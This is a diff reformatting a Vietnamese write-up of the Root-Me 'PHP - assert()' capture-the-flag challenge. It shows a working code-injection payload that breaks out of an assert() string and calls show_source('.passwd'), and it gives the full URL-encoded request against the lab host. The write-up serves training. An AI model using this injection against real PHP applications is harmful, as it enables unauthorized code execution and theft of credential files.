@@ -170,17 +170,17 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="write-up"><a class="header" href="#write-up">WRITE UP</a></h1>
-<p><strong>Challenge:</strong> <a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-assert">PHP - assert()</a></p>
-<p>Thử fuzz với payload: <a href="http://challenge01.root-me.org/web-serveur/ch47/?page=../">http://challenge01.root-me.org/web-serveur/ch47/?page=../</a></p>
-<img src="./media/image1.png" style="width:6.5in;height:0.81111in" alt="Graphical user interface, application Description automatically generated" />
-<p>Website sử dụng <strong>assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</strong> để check xem yêu cầu tìm xem có file hay không, nếu lỗi thì hiện message. Như vậy, ta cần injecton hàm assert này. Tra cheat sheet ta có thể nhét BOOLEAN kèm theo để buộc thực thi với <strong>die()</strong> và để hiển thị source bằng hàm <strong>show_source()</strong>:</p>
-<p><strong>and die(show_source('.passwd')) or '</strong></p>
+                        <h1 id="php---assert"><a class="header" href="#php---assert"><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-assert">PHP - assert()</a></a></h1>
+<p>Thử fuzz với payload: <code>http://challenge01.root-me.org/web-serveur/ch47/?page=../</code></p>
+<p><img src="./media/image1.png" alt="" /></p>
+<p>Website sử dụng <code>assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</code> để check xem yêu cầu tìm xem có file hay không, nếu lỗi thì hiện message. Như vậy, ta cần injecton hàm assert này. Tra cheat sheet ta có thể nhét BOOLEAN kèm theo để buộc thực thi với <strong>die()</strong> và để hiển thị source bằng hàm <code>show_source()</code>: <code>and die(show_source('.passwd')) or '</code></p>
 <p>Lúc này payload có dạng:</p>
-<p>assert("strpos(' ' <strong>and die(show_source('.passwd')) or</strong> ' ', '..') === false") <strong>or die("Detected hacking attempt!");</strong></p>
-<p><strong>Payload:</strong> <a href="http://challenge01.root-me.org/web-serveur/ch47/?page=%27%20and%20die(show_source(%27.passwd%27))%20or%20%27">http://challenge01.root-me.org/web-serveur/ch47/?page=%27%20and%20die(show_source(%27.passwd%27))%20or%20%27</a></p>
-<img src="./media/image2.png" style="width:6.5in;height:1.23125in" alt="Graphical user interface, text, application Description automatically generated" />
-<p>- Flag: ********************************</p>
+<p><code>assert("strpos(' ' and die(show\_source('.passwd')) or ' ', '..') === false") or die("Detected hacking attempt!");</code></p>
+<p><strong>Payload:</strong> <code>http://challenge01.root-me.org/web-serveur/ch47/?page=%27%20and%20die(show_source(%27.passwd%27))%20or%20%27</code></p>
+<p><img src="./media/image2.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
 
                     </main>
 
